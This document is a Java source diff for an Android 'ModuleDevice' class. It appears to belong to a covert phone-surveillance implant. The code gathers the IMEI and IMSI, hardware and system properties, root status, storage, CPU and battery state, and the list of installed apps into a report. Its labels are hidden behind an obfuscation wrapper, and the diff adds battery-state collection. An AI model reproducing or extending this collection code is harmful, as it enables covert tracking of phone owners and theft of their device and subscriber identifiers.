@@ -17,8 +17,11 @@ import java.util.List;
 import java.util.Map.Entry;
 import java.util.Properties;
 
+import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
+import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Environment;
 import android.os.StatFs;
@@ -85,78 +88,112 @@ public class ModuleDevice extends BaseInstantModule {
 	@Override
 	public void actualStart() {
 
-		// OS Version etc...
-		if (Cfg.DEBUG) {
-			Check.log(TAG + " Android");//$NON-NLS-1$
-		}
-
-		final Runtime runtime = Runtime.getRuntime();
-		final Properties properties = System.getProperties();
-		readCpuUsage();
-
 		final StringBuffer sb = new StringBuffer();
-		if (Cfg.DEBUG) {
-			sb.append("Debug\n"); //$NON-NLS-1$
-			final String timestamp = System.getProperty("build.timestamp"); //$NON-NLS-1$
-			if (timestamp != null) {
-				sb.append(timestamp + "\n"); //$NON-NLS-1$
+
+		try {
+			// OS Version etc...
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " Android");//$NON-NLS-1$
 			}
-		}
 
-		// SYSTEM
-		sb.append(M.e("-- SYSTEM --") + "\n"); //$NON-NLS-1$
-		sb.append(M.e("Board: ") + Build.BOARD + "\n");
-		sb.append(M.e("Brand: ") + Build.BRAND + "\n");
-		sb.append(M.e("Device: ") + Build.DEVICE + "\n");
-		sb.append(M.e("Display: ") + Build.MODEL + "\n");
-		sb.append(M.e("Model:") + Build.DISPLAY + "\n");
+			final Runtime runtime = Runtime.getRuntime();
+			final Properties properties = System.getProperties();
+			readCpuUsage();
 
-		sb.append(M.e("IMEI: ") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			if (Cfg.DEBUG) {
+				sb.append("Debug\n"); //$NON-NLS-1$
+				final String timestamp = System.getProperty("build.timestamp"); //$NON-NLS-1$
+				if (timestamp != null) {
+					sb.append(timestamp + "\n"); //$NON-NLS-1$
+				}
+			}
 
-		if (Device.self().getImei().length() == 0) {
-			sb.append(M.e("IMSI: SIM not present") + "\n"); //$NON-NLS-1$
-		} else {
-			sb.append(M.e("IMSI: ") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-		}
+			// SYSTEM
+			sb.append(M.e("-- SYSTEM --") + "\n"); //$NON-NLS-1$
+			sb.append(M.e("Board: ") + Build.BOARD + "\n");
+			sb.append(M.e("Brand: ") + Build.BRAND + "\n");
+			sb.append(M.e("Device: ") + Build.DEVICE + "\n");
+			sb.append(M.e("Display: ") + Build.MODEL + "\n");
+			sb.append(M.e("Model:") + Build.DISPLAY + "\n");
 
-		sb.append(M.e("cpuUsage: ") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-		sb.append(M.e("cpuTotal: ") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-		sb.append(M.e("cpuIdle: ") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			sb.append(M.e("IMEI: ") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
-		StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
-		long bytesAvailableInt = (long) stat.getBlockSize() * (long) stat.getBlockCount();
-		sb.append("internal space: " + bytesAvailableInt + "\n");
+			if (Device.self().getImei().length() == 0) {
+				sb.append(M.e("IMSI: SIM not present") + "\n"); //$NON-NLS-1$
+			} else {
+				sb.append(M.e("IMSI: ") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			}
 
-		stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
-		long bytesAvailableExt = (long) stat.getBlockSize() * (long) stat.getBlockCount();
+			sb.append(M.e("cpuUsage: ") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			sb.append(M.e("cpuTotal: ") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			sb.append(M.e("cpuIdle: ") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
-		sb.append("external state: " + Environment.getExternalStorageState() + "\n");
-		sb.append("external space: " + bytesAvailableExt + "\n");
+			StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
+			long bytesAvailableInt = (long) stat.getBlockSize() * (long) stat.getBlockCount();
+			sb.append("internal space: " + bytesAvailableInt + "\n");
 
-		if (Status.self().haveRoot()) {
-			sb.append(M.e("root: yes") + "\n"); //$NON-NLS-1$
-		} else {
-			sb.append(M.e("root: no") + "\n"); //$NON-NLS-1$
-		}
+			stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
+			long bytesAvailableExt = (long) stat.getBlockSize() * (long) stat.getBlockCount();
 
-		sb.append(M.e("-- PROPERTIES --") + "\n"); //$NON-NLS-1$
-		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
+			sb.append("external state: " + Environment.getExternalStorageState() + "\n");
+			sb.append("external space: " + bytesAvailableExt + "\n");
 
-		while (it.hasNext()) {
-			final Entry<Object, Object> pairs = it.next();
-			sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-		}
+			if (Status.self().haveRoot()) {
+				sb.append(M.e("root: yes") + "\n"); //$NON-NLS-1$
+			} else {
+				sb.append(M.e("root: no") + "\n"); //$NON-NLS-1$
+			}
+			
+			sb.append(M.e("-- BATTERY --") + "\n");
+			
+			IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+			Intent batteryStatus = Status.self().getAppContext().registerReceiver(null, ifilter);
+			// Are we charging / charged?
+			int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
+			boolean isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
+			                     status == BatteryManager.BATTERY_STATUS_FULL;
+			
+			sb.append(M.e("charging: ") + isCharging + "\n");
 
-		if (processList) {
-			final ArrayList<PInfo> apps = getInstalledApps(false); /*
-																	 * false =
-																	 * no system
-																	 * packages
-																	 */
-			final int max = apps.size();
+			// How are we charging?
+			int chargePlug = batteryStatus.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1);
+			boolean usbCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_USB;
+			boolean acCharge = chargePlug == BatteryManager.BATTERY_PLUGGED_AC;
+			
+			sb.append(M.e("charging USB: ") + usbCharge + "\n");
+			sb.append(M.e("charging AC: ") + acCharge + "\n");
+			
+			int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+			int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
 
-			for (int i = 0; i < max; i++) {
-				sb.append(apps.get(i) + "\n"); //$NON-NLS-1$
+			float batteryPct = level / (float)scale;
+			
+			sb.append(M.e("level: ") + batteryPct + "\n");
+
+			sb.append(M.e("-- PROPERTIES --") + "\n"); //$NON-NLS-1$
+			final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
+
+			while (it.hasNext()) {
+				final Entry<Object, Object> pairs = it.next();
+				sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+			}
+
+			if (processList) {
+				final ArrayList<PInfo> apps = getInstalledApps(false); /*
+																		 * false
+																		 * = no
+																		 * system
+																		 * packages
+																		 */
+				final int max = apps.size();
+
+				for (int i = 0; i < max; i++) {
+					sb.append(apps.get(i) + "\n"); //$NON-NLS-1$
+				}
+			}
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (actualStart) Error: " + ex);
 			}
 		}
 
@@ -267,15 +304,15 @@ public class ModuleDevice extends BaseInstantModule {
 			if ((!getSysPackages) && (p.versionName == null)) {
 				continue;
 			}
-			
-			try{
+
+			try {
 				final PInfo newInfo = new PInfo();
 				newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
 				newInfo.pname = p.packageName;
 				newInfo.versionName = p.versionName;
 				newInfo.versionCode = p.versionCode;
 				res.add(newInfo);
-			}catch(Exception e){
+			} catch (Exception e) {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (getInstalledApps) Error: " + e);
 				}
